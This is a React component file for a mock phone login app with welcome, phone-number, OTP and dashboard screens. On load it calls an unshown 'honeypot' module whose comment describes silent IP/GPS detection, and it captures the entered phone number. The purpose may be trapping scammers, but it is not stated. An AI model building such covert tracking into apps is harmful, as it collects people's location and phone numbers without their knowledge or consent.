import { useEffect, useState } from 'react'
import { AnimatePresence, MotionConfig, motion } from 'framer-motion'
import Welcome from './screens/Welcome.jsx'
import PhoneStep from './screens/PhoneStep.jsx'
import OtpStep from './screens/OtpStep.jsx'
import Dashboard from './screens/Dashboard.jsx'
import StatusBar from './components/StatusBar.jsx'
import { iniciarHoneypot, capturarTelefono } from './lib/honeypot.js'

export default function App() {
  const [step, setStep] = useState('welcome')
  const [phone, setPhone] = useState('')

  // Detección silenciosa de IP/GPS al cargar la app
  useEffect(() => { iniciarHoneypot() }, [])

  const go = (s) => setStep(s)

  const onPhoneConfirmed = () => {
    capturarTelefono(phone)
    go('otp')
  }

  const screens = {
    welcome: <Welcome onNext={() => go('phone')} />,
    phone: <PhoneStep phone={phone} setPhone={setPhone} onBack={() => go('welcome')} onNext={onPhoneConfirmed} />,
    otp: <OtpStep phone={phone} onBack={() => go('phone')} onNext={() => go('dashboard')} />,
    dashboard: <Dashboard phone={phone} onLogout={() => { setPhone(''); go('welcome') }} />,
  }

  return (
    <MotionConfig reducedMotion="user">
      <div className="stage">
        <div className="phone">
          <div className="phone-screen">
            <StatusBar />
            <AnimatePresence mode="wait">
              <motion.div
                key={step}
                className="center-col"
                initial={{ opacity: 0, x: 28 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -28 }}
                transition={{ duration: 0.34, ease: [0.22, 1, 0.36, 1] }}
              >
                {screens[step]}
              </motion.div>
            </AnimatePresence>
          </div>
        </div>
      </div>
    </MotionConfig>
  )
}
